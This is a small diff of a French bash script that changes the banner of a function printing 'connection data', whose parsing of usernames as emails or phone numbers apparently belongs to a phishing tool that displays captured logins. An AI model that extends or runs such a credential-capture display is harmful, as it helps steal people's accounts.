@@ -10,7 +10,7 @@ NC='\033[0m' # Pas de couleur
 
 # Fonction pour afficher les données de connexion
 afficher_donnees() {
-    echo -e "\n${CYAN}CONNEXION DÉTECTÉE ═══${NC}"
+    echo -e "\n${CYAN}\n\n═════════CONNEXION DÉTECTÉE ═══${NC}"
     while IFS= read -r ligne; do
         if [[ "$ligne" == *"Username:"* ]]; then
             echo -e "${VERT}✉️ E-mail/Numéro: ${NC}${ligne#*: }"
